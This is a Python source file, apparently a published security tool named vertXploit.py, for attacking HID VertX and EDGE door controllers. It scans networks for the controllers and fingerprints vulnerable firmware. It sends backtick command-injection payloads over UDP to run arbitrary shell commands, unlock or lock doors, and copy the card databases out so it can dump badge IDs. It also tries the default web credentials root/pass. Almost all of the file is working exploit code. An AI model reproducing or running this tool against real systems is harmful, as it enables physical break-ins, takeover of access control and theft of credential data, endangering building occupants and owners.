#!/usr/bin/env python
# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import argparse
import nmap
import os
import re
import requests
import socket
import tabulate
import time

try:
	requests.packages.urllib3.disable_warnings()
except:
	pass


def main():
	parser = argparse.ArgumentParser(prog='vertXploit.py', description='Exploit HID VertX and EDGE door controllers through command injection or the web interface.', usage='./vertXploit.py [discover, fingerprint, unlock, lock, raw, download, dump] [-h]')
	subparsers = parser.add_subparsers(dest='action', help='Action to perform on controller')

	discover_parser = subparsers.add_parser('discover', help='Discover controllers', usage='./vertXploit.py discover --ip <IP>')
	discover_parser.add_argument('--ip', dest='ip', help='VertX controller IP address (default: 255.255.255.255)', default='255.255.255.255', required=False)

	fingerprint_parser = subparsers.add_parser('fingerprint', help='Fingerprint controller', usage='./vertXploit.py fingerprint <IP>')
	fingerprint_parser.add_argument('ip', help='VertX controller IP address')

	unlock_parser = subparsers.add_parser('unlock', help='Unlock doors', usage='./vertXploit.py unlock <IP> --username <USERNAME> --password <PASSWORD>')
	unlock_parser.add_argument('ip', help='VertX controller IP address')
	unlock_parser.add_argument('--username', help='VertX web interface username, (default: root)', default='root', required=False)
	unlock_parser.add_argument('--password', help='VertX web interface password, (default: pass)', default='pass', required=False)

	lock_parser = subparsers.add_parser('lock', help='Lock doors', usage='./vertXploit.py lock <IP> --username <USERNAME> --password <PASSWORD>')
	lock_parser.add_argument('ip', help='VertX controller IP address')
	lock_parser.add_argument('--username', help='VertX web interface username, (default: root)', default='root', required=False)
	lock_parser.add_argument('--password', help='VertX web interface password, (default: pass)', default='pass', required=False)

	raw_parser = subparsers.add_parser('raw', help='Send raw Linux command', usage='./vertXploit.py raw <IP> <COMMAND>')
	raw_parser.add_argument('ip', help='VertX controller IP address')
	raw_parser.add_argument('command', help='Linux command, (example: ping -c 5 IP)', nargs='+')

	download_parser = subparsers.add_parser('download', help='Download controller database', usage='./vertXploit.py download <IP> --username <USERNAME> --password <PASSWORD>')
	download_parser.add_argument('ip', help='VertX controller IP address')
	download_parser.add_argument('--username', help='VertX web interface username, (default: root)', default='root', required=False)
	download_parser.add_argument('--password', help='VertX web interface password, (default: pass)', default='pass', required=False)

	dump_parser = subparsers.add_parser('dump', help='Dump card values from database', usage='./vertXploit.py dump --path <PATH>')
	dump_parser.add_argument('--path', help='Path to database files', default='.', required=False)

	args = parser.parse_args()

	# Discover
	if args.action == 'discover':
		discover(args.ip, args.action)

	# Fingerprint
	elif args.action == 'fingerprint':
		print_status("Sending discovery request to {0}".format(args.ip))
		fingerprint(args.ip, args.action)

	# Raw
	elif args.action == 'raw':
		raw(args.ip, ''.join(args.command), args.action)

	# Dump
	elif args.action == 'dump':
		if os.path.isfile("{0}/IdentDB".format(args.path)) and os.path.isfile("{0}/AccessDB".format(args.path)):
			print_status('Processing card information from VertX database')
			identdb_data = read_db("{0}/IdentDB".format(args.path))
			accessdb_data = read_db("{0}/AccessDB".format(args.path))
			parse_db(identdb_data, accessdb_data)
		else:
			print_error("Could not find IdentDB or AccessDB in {0}".format(os.path.abspath(args.path)))

	# Unlock, lock, or download
	else:
		door_actions(args.ip, args.username, args.password, args.action)


# Send raw Linux command
def raw(ip, command, action):
	external_ip, mac, model, vulnerable = fingerprint(ip, action)
	if vulnerable:
		if len(command) > 41:
			print_error("Command is too long to send in one request")
		else:
			print_status('Sending raw payload')
			format_payload(ip, mac, model, command, action)
	else:
		print_error('VertX controller is not vulnerable to command injection')


# Perform action on VertX controller
def door_actions(ip, username, password, action):
	HEADERS = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Connection': 'keep-alive'
	}

	external_ip, mac, model, vulnerable = fingerprint(ip, action)

	if external_ip:
		# Download databases
		if vulnerable and action == 'download':
			print_status('Downloading VertX databases')
			format_payload(external_ip, mac, model, None, action)
			download_db(external_ip, HEADERS, username, password)

		# Unlock or lock doors using command injection
		elif vulnerable and 'lock' in action:
			print_status("{0}ing doors using command injection".format(action.capitalize()))
			format_payload(external_ip, mac, model, None, action)
			print_good("Door successfully {0}ed".format(action))

		# Unlock or lock doors using web interface
		elif 'lock' in action:
			print_status("{0}ing doors through the web interface".format(action.capitalize()))
			response = web_request(external_ip, model, HEADERS, username, password, action)
			if response:
				print_good("Door successfully {0}ed".format(action))
			elif response is False:
				print_warn("Door {0} failed, bad credentials".format(action))
			else:
				print_error('VertX controller did not respond')

		# Handle actions if not vulnerable
		else:
			print_warn("VertX controller is not vulnerable, can not perform {0}".format(action))


# Search for VertX controllers on the network
def discover(ip, action):
	controllers = []

	if ip == '255.255.255.255':
		print_status('Sending discovery request to local broadcast network')

		# Send discover request to local broadcast network
		external_ip, mac, model, vulnerable = fingerprint(ip, action)
		if external_ip:
			controllers.append([external_ip, '4070', mac])
	else:
		network_cidr = "{0}.0/24".format('.'.join(ip.split('.')[:-1]))

		# Check open port
		print_status("Starting Nmap scan on {0}".format(network_cidr))

		nm = nmap.PortScanner()
		nm.scan(network_cidr, arguments='-n -sS --open -Pn -p4050')
		for host in nm.all_hosts():
			if nm[host].has_tcp(4050) and nm[host]['tcp'][4050]['state'] == 'open':
				potential_ip = nm[host]['addresses']['ipv4']

				# Pull info about VertX controller
				external_ip, mac, model, vulnerable = fingerprint(potential_ip, action)
				if external_ip:
					controllers.append([external_ip, '4050', mac])

	# Print results
	if len(controllers) > 0:
		print_good('VertX controllers found:')
		print(tabulate.tabulate(controllers, headers=['IP', 'Port', 'MAC'], tablefmt='psql', stralign='center', numalign='center'))
	else:
		print_warn('No VertX controllers found')


# Get information about VertX controller
def fingerprint(ip, action):
	data = send_command(ip, 'discover;013;', None)
	if data:
		response_data = data[0].split(';')
		name = response_data[3]
		model = response_data[6]
		version = response_data[7]
		date = response_data[8]
		internal_ip = response_data[4]
		external_ip = data[1][0]
		mac = response_data[2]

		# Legacy VertX controllers patched with firmware > 2.2.7.568
		# VertX EVO and EDGE EVO controllers patched with firmware > 3.5.1.1483
		switch = {
			'E400': 3511483,  # EDGEPlus
			'EH400': 3511483,  # EDGE EVO
			'EHS400': 3511483,  # EDGE EVO Solo
			'ES400': 3511483,  # EDGEPlus Solo
			'V2-V1000': 3511483,  # VertX EVO
			'V2-V2000': 3511483,  # VertX EVO
			'V1000': 227568,  # VertX Legacy
			'V2000': 227568  # VertX Legacy
		}

		patched_version = switch.get(model, 0)
		try:
			if int(version.replace('.', '')) <= patched_version:
				vulnerable = True
			else:
				vulnerable = False
		except ValueError:
				vulnerable = True

		if action == 'fingerprint':
			print_good("VertX Controller Information")
			print("RAW: {0}".format(data))
			print("Name: {0}".format(name))
			print("Model: {0}".format(model))
			print("Version: {0} - ({1})".format(version, date))
			print("Internal IP Address: {0}".format(internal_ip))
			print("External IP Address: {0}".format(external_ip))
			print("MAC Address: {0}".format(mac))

			if vulnerable:
				print("Vulnerable: \033[1m\033[32mTrue\033[0m\n")
			else:
				print("Vulnerable: \033[1m\033[33mFalse\033[0m\n")

		return external_ip, mac, model, vulnerable

	else:
		if action == 'fingerprint':
			print_warn('VertX controller did not responded to the discovery request')
		elif action == 'discover':
			return False


# Format command injection payload
def format_payload(ip, mac, model, command, action):
	if action == 'raw':
		payload_template = "{0};1`{1}`;".format(mac, command)
		print("({0})".format((payload_template.rstrip()).replace('\n', '\\n')))
		response = send_command(ip, 'command_blink_on;044;', payload_template)
		if response:
			print_good('Payload sent successfully')
		else:
			print_error('Failed to send payload')

	else:
		if action == 'unlock':
			commands = [
				"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(model),
				'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
				'chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi'
			]

		elif action == 'lock':
			commands = [
				'chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
				"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=0\"".format(model),
				"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi"
			]

		else:
			commands = [
				'cp /mnt/data/config/IdentDB /mnt/apps/web/',
				'cp /mnt/data/config/AccessDB /mnt/apps/web/',
				'sleep 15',
				'rm /mnt/apps/web/IdentDB',
				'rm /mnt/apps/web/AccessDB'
			]

		# Split payload in chunks
		payload_chunks = list(chunk_string('!'.join(commands), 24))
		for chunk in payload_chunks:
			payload_template = "{0};1`echo '{1}' >> /tmp/a`;".format(mac, chunk)
			print("({0})".format((payload_template.rstrip()).replace('\n', '\\n')))
			send_command(ip, 'command_blink_on;044;', payload_template)

		time.sleep(1)

		format_commands = [
			[
				"{0};1`tr -d '\n' < /tmp/a > /tmp/b`;".format(mac),
				"{0};1`tr '!' '\n' < /tmp/b > /tmp/a`;".format(mac),
				"{0};1`chmod +x /tmp/a`;".format(mac),
				"{0};1`/tmp/a`;".format(mac)
			],
			[
				"{0};1`rm /tmp/a`;".format(mac),
				"{0};1`rm /tmp/b`;".format(mac)
			]
		]

		print_status('Formating and executing payload')
		for payload in format_commands[0]:
			send_command(ip, 'command_blink_on;044;', payload)

		print_status('Sleeping for 10 seconds before cleaning up')
		time.sleep(10)

		for payload in format_commands[1]:
			send_command(ip, 'command_blink_on;044;', payload)


# Send commands to VertX controller
def send_command(ip, command, payload):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.settimeout(5)

	if ip == '255.255.255.255':
		s.bind(('', 0))
		s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

	if payload:
		payload_buffer = "{0}{1}".format(command, payload)
	else:
		payload_buffer = command

	try:
		s.sendto(payload_buffer, (ip, 4070))
		response = s.recvfrom(1024)
		s.close()
	except socket.timeout:
		payload_response = None
	else:
		if payload and response[0].split(';')[0] == 'ack':
			payload_response = True
		elif response[0].split(';')[0] == 'discover':
			payload_response = False
		else:
			payload_response = response

	s.close()
	return payload_response


# VertX actions through web interface
def web_request(ip, model, headers, username, password, action):
	if action == 'unlock':
		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=1&MS={2}406".format(ip, model, int(time.time()))
	else:
		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=0&MS={2}406".format(ip, model, int(time.time()))

	try:
		response = requests.get(url, headers=headers, auth=(username, password), verify=False)
		if response.status_code == 401:
			return False
		else:
			vertx_response = (response.text).split(';')[1]
			if vertx_response == ';-1504;':
				return True
			elif vertx_response == ';0;':
				return False
			else:
				return None
	except requests.exceptions.RequestException as error:
		return None


# Download database
def download_db(ip, headers, username, password):
	databases = ['IdentDB', 'AccessDB']

	for database in databases:
		try:
			url = "http://{0}/{1}".format(ip, database)
			download = requests.get(url, headers=headers, auth=(username, password), stream=True, verify=False)
			if download.status_code == 200:
				with open(database, 'wb') as f:
					for chunk in download.iter_content(chunk_size=1024):
						f.write(chunk)
				f.close()
				print_good("Successfully downloaded {0}".format(database))
			elif download.status_code == 401:
				print_warn('Download failed, bad credentials')
			else:
				print_error("Unable to find database at {0}".format(url))
		except Exception as error:
			print_error('VertX controller web interface did not respond')


# Pull info from databases
def read_db(db):
	data = []
	counter = 1
	entry = 0

	with open(db, 'rb') as file_stream:
		if 'IdentDB' in db:
			block_size = 28
		else:
			block_size = 44

		while entry < 255:
			card_block = file_stream.read(block_size)
			if card_block:
				if (counter == 1) or (counter % block_size == 1):
					card_data = ''
					entry += 1
					counter = 1

				for character in card_block:
					card_data += "{0:0{1}X}".format(ord(character), 2)
					counter += 1

				data.append(card_data)
			else:
				break

	file_stream.close()

	return data


# Parse card information from databases
def parse_db(identdb, accessdb):
	card_data = []

	# Get card info from IdentDB
	for i_entry in identdb:
		I_ENTRY_NUMBER = 16
		I_CARD_ID = 10
		I_ENABLED = 24

		db_id = i_entry[(I_ENTRY_NUMBER * 2):(I_ENTRY_NUMBER * 2) + 2]
		card_id = i_entry[0:I_CARD_ID * 2]
		card_status = i_entry[I_ENABLED * 2:(I_ENABLED * 2) + 2]

		# Get card status from IdentDB
		if card_status == '00':
			enabled = 'True'
		elif card_status == '01':
			enabled = 'False'
		else:
			enabled = 'Unknown'

		# Get door access from AccessDB
		for a_entry in accessdb:
			A_ENTRY_NUMBER = 0
			A_DOOR_ACCESS = 8

			accessdb_id = a_entry[A_ENTRY_NUMBER * 2:(A_ENTRY_NUMBER * 2) + 2]
			if accessdb_id == db_id:
				door_access = a_entry[A_DOOR_ACCESS * 2:(A_DOOR_ACCESS * 2) + 2]
				break
			else:
				continue

		database_row = [db_id, card_id, door_access, enabled]
		card_data.append(database_row)

	if len(card_data) > 0:
		print(tabulate.tabulate(card_data, headers=['DB ID', 'Card ID', 'Door', 'Enabled'], tablefmt='psql', stralign='center', numalign='center'))
	else:
		print_warn('No cards in database')


# Split command because of 41 character length limit
def chunk_string(command, length):
	return (command[0 + i:length + i] for i in range(0, len(command), length))


def print_error(msg):
	print("\033[1m\033[31m[-]\033[0m {0}".format(msg))


def print_status(msg):
	print("\033[1m\033[34m[*]\033[0m {0}".format(msg))


def print_good(msg):
	print("\033[1m\033[32m[+]\033[0m {0}".format(msg))


def print_warn(msg):
	print("\033[1m\033[33m[!]\033[0m {0}".format(msg))

if __name__ == '__main__':
	main()
